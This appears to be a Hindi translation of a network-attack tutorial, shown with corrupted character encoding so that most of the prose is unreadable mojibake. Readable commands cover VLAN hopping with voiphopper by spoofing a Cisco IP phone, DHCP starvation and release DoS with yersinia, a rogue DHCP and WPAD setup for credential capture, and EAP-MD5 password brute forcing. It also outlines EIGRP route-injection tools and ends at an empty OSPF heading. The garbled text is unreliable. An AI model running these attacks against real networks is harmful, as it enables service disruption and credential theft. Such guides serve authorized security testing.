рд╣рд╛рд▓рд╛рдВрдХрд┐ VoIP (Voice over Internet Protocol) рдлреЛрди рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЗрд░рд╛рджрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛, рдЖрдзреБрдирд┐рдХ VoIP рдЙрдкрдХрд░рдгреЛрдВ рдХреЛ рдмрдврд╝рддреЗ рд╣реБрдП IoT рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдЕрдм рдХрдИ рдХрд░реНрдордЪрд╛рд░реА рдПрдХ рд╡рд┐рд╢реЗрд╖ рдлреЛрди рдирдВрдмрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджрд░рд╡рд╛рдЬреЗ рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдХрдорд░реЗ рдХреЗ рдерд░реНрдореЛрд╕реНрдЯреЗрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ...

рдЙрдкрдХрд░рдг [**voiphopper**](http://voiphopper.sourceforge.net) Cisco, Avaya, Nortel, рдФрд░ Alcatel-Lucent рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рдПрдХ VoIP рдлреЛрди рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреА рдирдХрд▓ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдбрд┐рд╡рд╛рдЗрд╕ рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдореЗрдВ рд╕реЗ рдПрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╡рд╛рдЬ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рд╕рд╣реА VLAN ID рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ Cisco Discovery Protocol (CDP), Dynamic Host Configuration Protocol (DHCP), Link Layer Discovery Protocol Media Endpoint Discovery (LLDP-MED), рдФрд░ 802.1Q ARPред

**VoIP Hopper** **рддреАрди** CDP рдореЛрдбреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред **sniff** рдореЛрдб рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдФрд░ VLAN ID рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`-c`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ `0` рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред **spoof** рдореЛрдб рдХреЙрд░реНрдкреЛрд░реЗрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ VoIP рдЙрдкрдХрд░рдг рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреИрдХреЗрдЯреНрд╕ рдХреЗ рд╕рдорд╛рди рдХрд╕реНрдЯрдо рдкреИрдХреЗрдЯреНрд╕ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`-c`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ **`1`** рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред **pre-madepacket** рдореЛрдб рдХреЗ рд╕рд╛рде **spoof** рдореЛрдб Cisco 7971G-GE IP рдлреЛрди рдХреЗ рд╕рдорд╛рди рдкреИрдХреЗрдЯреНрд╕ рднреЗрдЬрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`-c`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ **`2`** рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред

рд╣рдо рдЕрдВрддрд┐рдо рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдмрд╕реЗ рддреЗрдЬрд╝ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╣реИред **`-i`** рдкреИрд░рд╛рдореАрдЯрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ **рдиреЗрдЯрд╡рд░реНрдХ** **рдЗрдВрдЯрд░рдлреЗрд╕** рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ, рдФрд░ **`-E`** рдкреИрд░рд╛рдореАрдЯрд░ рдирдХрд▓ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ **VOIP рдЙрдкрдХрд░рдг рдХрд╛ рдирд╛рдо** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред рд╣рдордиреЗ SEP001EEEEEEEEE рдирд╛рдо рдЪреБрдирд╛, рдЬреЛ VoIP рдлреЛрди рдХреЗ рд▓рд┐рдП Cisco рдирд╛рдордХрд░рдг рдкреНрд░рд╛рд░реВрдк рдХреЗ рд╕рд╛рде рд╕рдВрдЧрдд рд╣реИред рдкреНрд░рд╛рд░реВрдк рдореЗрдВ "SEP" рд╢рдмреНрдж рдХреЗ рдмрд╛рдж рдПрдХ MAC рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИред рдХреЙрд░реНрдкреЛрд░реЗрдЯ рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ, рдЖрдк рдлреЛрди рдХреЗ рдкреАрдЫреЗ рдХреЗ MAC рд▓реЗрдмрд▓ рдХреЛ рджреЗрдЦрдХрд░; рдлреЛрди рдХреА рдбрд┐рд╕реНрдкреНрд▓реЗ рд╕реНрдХреНрд░реАрди рдкрд░ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдмрдЯрди рджрдмрд╛рдХрд░ рдФрд░ рдореЙрдбрд▓ рдЗрдиреНрдлреЙрд░реНрдореЗрд╢рди рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЪрдпрди рдХрд░рдХреЗ; рдпрд╛ рдЕрдкрдиреЗ рд▓реИрдкрдЯреЙрдк рд╕реЗ VoIP рдЙрдкрдХрд░рдг рдХреЗ рдИрдерд░рдиреЗрдЯ рдХреЗрдмрд▓ рдХреЛ рдЬреЛрдбрд╝рдХрд░ рдФрд░ Wireshark рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдХрд░рдг рдХреЗ CDP рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рджреЗрдЦрдХрд░ рдПрдХ рдореМрдЬреВрджрд╛ VoIP рдЙрдкрдХрд░рдг рдХреА рдирдХрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
рдпрджрд┐ рдЙрдкрдХрд░рдг рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рддреЛ **VLAN рдиреЗрдЯрд╡рд░реНрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдЙрдкрдХрд░рдг рдХреЛ IPv4 рдкрддрд╛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдЧрд╛**ред

### DHCP рд╣рдорд▓реЗ

#### рд╕реВрдЪреАрдХрд░рдг
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**DoS рдХреЗ рджреЛ рдкреНрд░рдХрд╛рд░** DHCP рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рджрд░реНрд╢рди рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдкрд╣рд▓рд╛ рддрд░реАрдХрд╛ рд╣реИ **рдкрд░реНрдпрд╛рдкреНрдд рдирдХрд▓реА рд╣реЛрд╕реНрдЯреНрд╕ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдирд╛ рддрд╛рдХрд┐ рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд IP рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред\
рдпрд╣ рд╣рдорд▓рд╛ рдХреЗрд╡рд▓ рддрдм рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЬрдм рдЖрдк DHCP рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рд╕рд╛рдж рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдкреВрд░рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (**Discover** (Comp) --> **Offer** (рд╕рд░реНрд╡рд░) --> **Request** (Comp) --> **ACK** (рд╕рд░реНрд╡рд░))ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣ **Wifi рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ**ред

DHCP DoS рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдиреНрдп рддрд░реАрдХрд╛ рд╣реИ **рд╣рд░ рд╕рдВрднрд╛рд╡рд┐рдд IP рдХрд╛ рд╕реНрд░реЛрдд рдХреЛрдб рдХреЗ рд░реВрдк рдореЗрдВ DHCP-RELEASE рдкреИрдХреЗрдЯ рднреЗрдЬрдирд╛**ред рдлрд┐рд░, рд╕рд░реНрд╡рд░ рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ рд╕рднреА рдиреЗ IP рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рд╣реИред
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
#### рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдорд╛рди рд╕реЗрдЯ рдХрд░реЗрдВ

рдЖрдк Responder DHCP рд╕реНрдХреНрд░рд┐рдкреНрдЯ (_/usr/share/responder/DHCP.py_) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд░реЛрдЧ DHCP рд╕рд░реНрд╡рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЧреЗрдЯрд╡реЗ рд╕реЗрдЯ рдХрд░рдирд╛ рдЖрджрд░реНрд╢ рдирд╣реАрдВ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╣рд╛рдИрдЬреИрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрдиреЗрдХреНрд╢рди рдХреЗрд╡рд▓ рдЖрдзрд╛-рдбреБрдкреНрд▓реЗрдХреНрд╕ рд╣реЛрддрд╛ рд╣реИ (рдЕрд░реНрдерд╛рддреН, рд╣рдо рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рдирд┐рдХрд▓рдиреЗ рд╡рд╛рд▓реЗ рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╡реИрдз рдЧреЗрдЯрд╡реЗ рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рдирд╣реАрдВ)ред рдЗрд╕рд▓рд┐рдП, рдореИрдВ HTTP рдЯреНрд░реИрдлрд┐рдХ рдФрд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд░реЛрдЧ DNS рдпрд╛ WPAD рд╕рд░реНрд╡рд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░реВрдВрдЧрд╛ред

| рд╡рд┐рд╡рд░рдг                                       | рдЙрджрд╛рд╣рд░рдг                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| рд╣рдорд╛рд░рд╛ IP рдкрддрд╛, рдПрдХ рдЧреЗрдЯрд╡реЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд   | _-i 10.0.0.100_                                                              |
| рд╕реНрдерд╛рдиреАрдп DNS рдбреЛрдореЗрди рдирд╛рдо (рд╡реИрдХрд▓реНрдкрд┐рдХ)            | _-d example.org_                                                             |
| рдореВрд▓ рд░рд╛рдЙрдЯрд░/рдЧреЗрдЯрд╡реЗ рдХрд╛ IP рдкрддрд╛                 | _-r 10.0.0.1_                                                                |
| рдкреНрд░рд╛рдердорд┐рдХ DNS рд╕рд░реНрд╡рд░ IP рдкрддрд╛                   | _-p 10.0.0.100_                                                              |
| рджреНрд╡рд┐рддреАрдпрдХ DNS рд╕рд░реНрд╡рд░ IP рдкрддрд╛ (рд╡реИрдХрд▓реНрдкрд┐рдХ)        | _-s 10.0.0.1_                                                                |
| рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ рдиреЗрдЯрдорд╛рд╕реНрдХ                | _-n 255.255.255.0_                                                           |
| DHCP рдЯреНрд░реИрдлрд┐рдХ рдХреЗ рд▓рд┐рдП рд╕реБрдирдиреЗ рд╡рд╛рд▓рд╛ рдЗрдВрдЯрд░рдлреЗрд╕     | _-I eth1_                                                                    |
| WPAD рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрддрд╛ (URL)                 | _-w тАЬ[http://10.0.0.100/wpad.dat\nтАЭ](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреЗрдЯрд╡реЗ IP рдкрддрд╛ рдХрд╛ рдирдХрд▓реАрдХрд░рдг           | -S                                                                           |
| рд╕рднреА DHCP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЙрддреНрддрд░ рджреЗрдирд╛ (рдмрд╣реБрдд рд╢реЛрд░) | -R                                                                           |

### **EAP рд╣рдорд▓реЗ**

рдпрд╣рд╛рдВ рдХреБрдЫ рд╣рдорд▓реЗ рдХреА рд░рдгрдиреАрддрд┐рдпрд╛рдВ рд╣реИрдВ рдЬреЛ 802.1X рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рдЦрд┐рд▓рд╛рдл рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

* EAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдЧреНрд░рд╛рдЗрдВрдбрд┐рдВрдЧ
* рдорд╛рд▓рдлреЙрд░реНрдореНрдб EAP рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде RADIUS рд╕рд░реНрд╡рд░ рдкрд░ рд╣рдорд▓рд╛ _\*\*_(exploits)
* EAP рд╕рдВрджреЗрд╢ рдХреИрдкреНрдЪрд░ рдФрд░ рдСрдлрд▓рд╛рдЗрди рдкрд╛рд╕рд╡рд░реНрдб рдХреНрд░реИрдХрд┐рдВрдЧ (EAP-MD5 рдФрд░ PEAP)
* TLS рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдорд╛рдиреНрдпрддрд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП EAP-MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдордЬрдмреВрд░ рдХрд░рдирд╛
* рд╣рдм рдпрд╛ рдЗрд╕реА рддрд░рд╣ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рдж рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдкреАрдбрд╝рд┐рдд рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдореЗрдВ рд╣реИ, рддреЛ рд╡рд╣ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ EAP-MD5 рдореЗрдВ рдЧрд┐рд░рд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ) рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдлрд┐рд░, рд╡рд╣ рдЗрд╕реЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
eapmd5pass тАУr pcap.dump тАУw /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) рд╣рдорд▓реЗ <a href="#6196" id="6196"></a>

**FHRP** (рдкреНрд░рдердо рд╣реЙрдк рд░рд┐рдбрдВрдбреЗрдВрд╕реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓) рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдХреА рдПрдХ рд╢реНрд░реЗрдгреА рд╣реИ рдЬрд┐рд╕реЗ **рдЧрд░реНрдо рд░рд┐рдбрдВрдбреЗрдВрдЯ рд░реВрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред FHRP рдХреЗ рд╕рд╛рде, рднреМрддрд┐рдХ рд░рд╛рдЙрдЯрд░реНрд╕ рдХреЛ рдПрдХ рдПрдХрд▓ рддрд╛рд░реНрдХрд┐рдХ рдбрд┐рд╡рд╛рдЗрд╕ рдореЗрдВ рд╕рдВрдпреЛрдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рджреЛрд╖ рд╕рд╣рд┐рд╖реНрдгреБрддрд╛ рдмрдврд╝рд╛рддрд╛ рд╣реИ рдФрд░ рд▓реЛрдб рдХреЛ рд╡рд┐рддрд░рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

**Cisco Systems рдХреЗ рдЗрдВрдЬреАрдирд┐рдпрд░реЛрдВ рдиреЗ рджреЛ FHRP рдкреНрд░реЛрдЯреЛрдХреЙрд▓, GLBP рдФрд░ HSRP рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдП рд╣реИрдВред**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

рд░реВрдЯрд┐рдВрдЧ рдЗрдиреНрдлреЙрд░реНрдореЗрд╢рди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (RIP) рдХреЗ рддреАрди рд╕рдВрд╕реНрдХрд░рдг рд╣реИрдВтАФRIP, RIPv2, рдФрд░ RIPngред RIP рдФрд░ RIPv2 UDP рдбреЗрдЯрд╛рдЧреНрд░рд╛рдореНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдкреЛрд░реНрдЯ 520 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд╛рдерд┐рдпреЛрдВ рдХреЛ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрдмрдХрд┐ RIPng UDP рдкреЛрд░реНрдЯ 521 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ IPv6 рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдХреЗ рдЬрд░рд┐рдП рдбреЗрдЯрд╛рдЧреНрд░рд╛рдореНрд╕ рдХрд╛ рдкреНрд░рд╕рд╛рд░рдг рдХрд░рддрд╛ рд╣реИред RIPv2 рдиреЗ MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдорд░реНрдерди рдкреЗрд╢ рдХрд┐рдпрд╛ред RIPng рдореЗрдВ рдореВрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реИ; рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдпрд╣ IPv6 рдХреЗ рднреАрддрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ IPsec AH рдФрд░ ESP рд╣реЗрдбрд░реНрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП _**Network Security Assessment: Know Your Network (3rd edition).**_ рдкреБрд╕реНрддрдХ рджреЗрдЦреЗрдВред

### EIGRP рд╣рдорд▓реЗ

**EIGRP (рдПрдиреНрд╣рд╛рдВрд╕реНрдб рдЗрдВрдЯреАрд░рд┐рдпрд░ рдЧреЗрдЯрд╡реЗ рд░реВрдЯрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓)** рдПрдХ рдЧрддрд┐рд╢реАрд▓ рд░реВрдЯрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИред **рдпрд╣ рдПрдХ рджреВрд░реА-рд╡реЗрдХреНрдЯрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИред** рдпрджрд┐ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдирд╣реАрдВ рд╣реИ** рдФрд░ рдкреИрд╕рд┐рд╡ рдЗрдВрдЯрд░рдлреЗрд╕реЗрд╕ рдХрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдирд╣реАрдВ рд╣реИ, рддреЛ рдПрдХ **рдШреБрд╕рдкреИрдард┐рдпрд╛** EIGRP рд░реВрдЯрд┐рдВрдЧ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓реНрд╕ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ** рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, EIGRP рдиреЗрдЯрд╡рд░реНрдХ (рджреВрд╕рд░реЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ, рд╕реНрд╡рд╛рдпрддреНрдд рдкреНрд░рдгрд╛рд▓реА) **рд╕рдорддрд▓ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрди рдирд╣реАрдВ рд╣реИ**ред рдпрджрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдорд╛рд░реНрдЧ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ**, рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдпрд╣ рдорд╛рд░реНрдЧ рд╕реНрд╡рд╛рдпрддреНрдд EIGRP рдкреНрд░рдгрд╛рд▓реА рдореЗрдВ рдкреВрд░реЗ рднрд░ рдореЗрдВ **рдлреИрд▓ рдЬрд╛рдПрдЧрд╛**ред

EIGRP рдкреНрд░рдгрд╛рд▓реА рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдПрдХ рд╡реИрдз EIGRP рд░рд╛рдЙрдЯрд░ рдХреЗ рд╕рд╛рде рдПрдХ рдкрдбрд╝реЛрд╕реА рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**, рдЬрд┐рд╕рд╕реЗ рдмреБрдирд┐рдпрд╛рджреА рдЯреЛрд╣реА рд╕реЗ рд▓реЗрдХрд░ рд╡рд┐рднрд┐рдиреНрди рдЗрдВрдЬреЗрдХреНрд╢рди рддрдХ рдХреА рдХрдИ рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рдЦреБрд▓ рдЬрд╛рддреА рд╣реИрдВред

\*\*\*\*[**FRRouting**](https://frrouting.org/) рдЖрдкрдХреЛ **рдПрдХ рдЖрднрд╛рд╕реА рд░рд╛рдЙрдЯрд░ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ BGP, OSPF, EIGRP, RIP рдФрд░ рдЕрдиреНрдп рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред** рдЖрдкрдХреЛ рдмрд╕ рдЗрд╕реЗ рдЕрдкрдиреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рддреИрдирд╛рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдЖрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд░реВрдЯрд┐рдВрдЧ рдбреЛрдореЗрди рдореЗрдВ рдПрдХ рд╡реИрдз рд░рд╛рдЙрдЯрд░ рд╣реЛрдиреЗ рдХрд╛ рдирд╛рдЯрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) рднреА EIGRP рдкреНрд░рд╕рд╛рд░рдгреЛрдВ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдФрд░ рдкреИрдХреЗрдЯреНрд╕ рдХреЗ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд░реВрдЯрд┐рдВрдЧ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП _**Network Security Assessment: Know Your Network (3rd edition).**_ рдкреБрд╕реНрддрдХ рджреЗрдЦреЗрдВред

### OSPF

